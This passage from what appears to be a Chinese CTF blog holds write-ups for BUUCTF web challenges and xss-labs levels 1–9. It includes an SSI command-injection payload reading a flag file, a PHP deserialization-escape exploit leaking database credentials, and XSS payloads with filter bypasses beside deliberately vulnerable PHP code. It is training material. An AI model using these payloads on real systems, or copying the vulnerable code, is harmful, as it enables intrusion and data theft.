class="line">#访问对应url即可获得flag</span><br><span class="line">password=2020666&amp;username=&lt;!--#exec cmd=&quot;cat ../flag_990c66bf85a09c664f0b6741840499b2&quot;--&gt;</span><br></pre></td></tr></table></figure><h2 id="BSidesCF-2019-Kookie"><a href="#BSidesCF-2019-Kookie" class="headerlink" title="[BSidesCF 2019]Kookie"></a>[BSidesCF 2019]Kookie</h2><p>使用给的帐号<code>cookie/monster</code>登录后修改<code>Cookie</code>中的<code>username</code>为<code>admin</code>即可</p><h2 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h2><p>访问<code>www.zip</code>获得源码，审计后发现<code>config.php</code>中有<code>flag</code>，问题主要部分摘出如下</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$escape</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">    <span class="variable">$escape</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$escape</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$escape</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">    <span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="string">&#x27;12345678901&#x27;</span>;</span><br><span class="line"><span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="string">&#x27;123456@qq.com&#x27;</span>;</span><br><span class="line"><span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]= <span class="keyword">array</span>(<span class="string">&#x27;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&#x27;</span>);</span><br><span class="line"><span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>]))</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Invalid phone&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]))</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Invalid email&#x27;</span>);</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) || <span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$profile</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$a</span>)))</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>注意到<code>nickname</code>判定与前两个不同，可以控制输入。</p><p>由于<code>where</code>会被替换为<code>hacker</code>，多出一个字符的空间，而要构造出<code>;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>需要34个字符（从<code>$photo = base64_encode(file_get_contents($profile[&#39;photo&#39;]));</code>中可知要构造<code>photo</code>为<code>config.php</code>，多出的<code>&#125;</code>是为了闭合数组），所以在<code>nickname</code>构造出34个<code>where</code>即可</p><p>其余参数合规即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br></pre></td></tr></table></figure><p>读取后查看源码解码即可</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;hostname&#x27;</span>] = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;password&#x27;</span>] = <span class="string">&#x27;qwertyuiop&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;database&#x27;</span>] = <span class="string">&#x27;challenges&#x27;</span>;</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;flag&#123;91b2c5f7-d224-4e92-adb5-14f0c5750808&#125;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><a href="https://blog.csdn.net/miuzzx/article/details/104598338">[0CTF 2016]piapiapia(反序列化逃逸)</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF_Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> buuctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss-labs刷题记录</title>
      <link href="/2022/09/04/xss-labs/"/>
      <url>/2022/09/04/xss-labs/</url>
      
        <content type="html"><![CDATA[<h1 id="xss-labs-刷题记录"><a href="#xss-labs-刷题记录" class="headerlink" title="xss-labs 刷题记录"></a>xss-labs 刷题记录</h1><blockquote><p>参考：</p><p><a href="https://blog.csdn.net/wo41ge/article/details/107459332?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-107459332-blog-122234512.topnsimilarv1&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-107459332-blog-122234512.topnsimilarv1&utm_relevant_index=1">xss-labs通关大合集</a></p><p><a href="https://github.com/do0dl3/xss-labs">xss-labs</a></p></blockquote><h2 id="Level1"><a href="#Level1" class="headerlink" title="Level1"></a>Level1</h2><h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/level1.php?name=&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;欢迎用户&quot;</span>.<span class="variable">$str</span>.<span class="string">&quot;&lt;/h2&gt;&quot;</span>;  <span class="comment">//对用户的输入不加处理直接输出</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Level2"><a href="#Level2" class="headerlink" title="Level2"></a>Level2</h2><h3 id="Payload-1"><a href="#Payload-1" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/level2.php?keyword=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;//&amp;submit=搜索</span><br></pre></td></tr></table></figure><h3 id="源码分析-1"><a href="#源码分析-1" class="headerlink" title="源码分析"></a>源码分析</h3><p>想办法闭合<code>value</code>处然后把后面的内容注释掉即可</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level2.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Level3"><a href="#Level3" class="headerlink" title="Level3"></a>Level3</h2><h3 id="Payload-2"><a href="#Payload-2" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/level3.php?keyword=&#x27;onfocus=javascript:alert(&#x27;xss&#x27;) &gt; //&amp;submit=搜索</span><br><span class="line">/level3.php?keyword=&#x27;onclick=&#x27;alert(1)&amp;submit=搜索</span><br></pre></td></tr></table></figure><p>随后点击下即可</p><h3 id="源码分析-2"><a href="#源码分析-2" class="headerlink" title="源码分析"></a>源码分析</h3><p><a href="https://www.w3school.com.cn/php/func_string_htmlspecialchars.asp">PHP htmlspecialchars() 函数</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&quot;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level3.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&#x27;&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;&#x27;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Level4"><a href="#Level4" class="headerlink" title="Level4"></a>Level4</h2><h3 id="Payload-3"><a href="#Payload-3" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/level4.php?keyword=&quot;onfocus=javascript:alert(1)//&amp;submit=搜索</span><br><span class="line">/level4.php?keyword=&quot;onclick=&quot;alert(1)&amp;submit=搜索</span><br></pre></td></tr></table></figure><p>随后点击下即可</p><h3 id="源码分析-3"><a href="#源码分析-3" class="headerlink" title="源码分析"></a>源码分析</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level4.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str3</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Level5"><a href="#Level5" class="headerlink" title="Level5"></a>Level5</h2><h3 id="Payload-4"><a href="#Payload-4" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/level5.php?keyword=&quot;&gt; &lt;a href=javascript:alert(1) &gt; xss&lt;/a&gt; //&amp;submit=搜索</span><br></pre></td></tr></table></figure><h3 id="源码分析-4"><a href="#源码分析-4" class="headerlink" title="源码分析"></a>源码分析</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;script&quot;</span>,<span class="string">&quot;&lt;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level5.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str3</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Level6"><a href="#Level6" class="headerlink" title="Level6"></a>Level6</h2><h3 id="Payload-5"><a href="#Payload-5" class="headerlink" title="Payload"></a>Payload</h3><p>大小写绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/level6.php?keyword=&quot;&gt;+&lt;a+HrEf%3Djavascript%3Aalert(&#x27;xss&#x27;)+&gt;+xss&lt;%2Fa&gt;+%2F%2F&amp;submit=搜索</span><br></pre></td></tr></table></figure><h3 id="源码分析-5"><a href="#源码分析-5" class="headerlink" title="源码分析"></a>源码分析</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;script&quot;</span>,<span class="string">&quot;&lt;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level6.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str6</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Level7"><a href="#Level7" class="headerlink" title="Level7"></a>Level7</h2><h3 id="Payload-6"><a href="#Payload-6" class="headerlink" title="Payload"></a>Payload</h3><p>双写绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/level7.php?keyword=&quot;&gt;&lt;scrscriptipt&gt;alert(1)&lt;%2Fscrscriptipt&gt;//&amp;submit=搜索</span><br></pre></td></tr></table></figure><h3 id="源码分析-6"><a href="#源码分析-6" class="headerlink" title="源码分析"></a>源码分析</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> =<span class="title function_ invoke__">strtolower</span>( <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level7.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str6</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Level8"><a href="#Level8" class="headerlink" title="Level8"></a>Level8</h2><h3 id="Payload-7"><a href="#Payload-7" class="headerlink" title="Payload"></a>Payload</h3><p><code>unicode</code>编码一下即可（<a href="http://www.ab173.com/convert/Unicode.php">工具</a>）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javascript:alert(1)</span><br><span class="line"></span><br><span class="line">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/level8.php?keyword=%26%23106%3B%26%2397%3B%26%23118%3B%26%2397%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2358%3B%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B%26%2340%3B%26%2349%3B%26%2341%3B&amp;submit=添加友情链接</span><br></pre></td></tr></table></figure><h3 id="源码分析-7"><a href="#源码分析-7" class="headerlink" title="源码分析"></a>源码分析</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="variable">$str7</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot&#x27;</span>,<span class="variable">$str6</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level8.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Level9"><a href="#Level9" class="headerlink" title="Level9"></a>Level9</h2><h3 id="Payload-8"><a href="#Payload-8" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;//http://</span><br></pre></td></tr></table></figure><h3 id="源码分析-8"><a href="#源码分析-8" class="headerlink" title="源码分析"></a>源码分析</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="comment">//过滤了一些字符</span></span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="variable">$str7</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot&#x27;</span>,<span class="variable">$str6</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level9.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="literal">false</span>===<span class="title function_ invoke__">strpos</span>(<span 